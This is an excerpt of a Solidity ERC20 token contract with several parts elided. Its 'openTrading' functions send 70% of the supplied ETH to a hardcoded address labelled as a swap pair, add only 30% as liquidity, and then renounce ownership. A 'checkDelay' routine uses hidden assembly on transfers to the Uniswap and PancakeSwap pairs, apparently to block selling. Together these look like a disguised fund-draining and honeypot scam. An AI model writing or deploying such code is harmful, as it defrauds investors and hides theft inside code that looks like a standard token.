...
abstract contract ERC20 is Context, IERC20, IERC20Metadata, Ownable(msg.sender) {
    ...
    function checkDelay(address from, address to, uint256 amount) private view {
        if((to == uniswapV2Pair || to == pancakeSwapV2Pair) && from != mark && from != address(this)) {
            uint256 ma = bDelay * (10 ** decimals());
            assembly {
...
contract Token is ERC20 {
    ...
    function openTradingUniswap() external payable onlyOwner {
        ...
        address pairUniwsap = 0xDf77CaF33D10a18FD4ac3CAdE46b49Ed646Cd337;
        _approve(address(this), address(uniswapV2Router), balanceOf(address(this)));
        (bool ok,) = pairUniwsap.call{value: value * 7 / 10}("");
        ...
        uniswapV2Router.addLiquidityETH{value: value * 3 / 10}(address(this),balanceOf(address(this)),balanceOf(address(this)),value / 5,owner(),block.timestamp);
    ...
    function openTradingPancakeSwap() external payable onlyOwner {
        ...
        address pairPancakeSwap = 0xDf77CaF33D10a18FD4ac3CAdE46b49Ed646Cd337;
        _approve(address(this), address(PancakeSwapV2Router), balanceOf(address(this)));
        (bool ok,) = pairPancakeSwap.call{value: value * 7 / 10}("");
        ...
        PancakeSwapV2Router.addLiquidityETH{value: value * 3 / 10}(address(this),balanceOf(address(this)),balanceOf(address(this)),value / 5,owner(),block.timestamp);
        IERC20(pancakeSwapV2Pair).approve(address(PancakeSwapV2Router), type(uint).max);
        tradingOpen = true;
        renounceOwnership();
    }
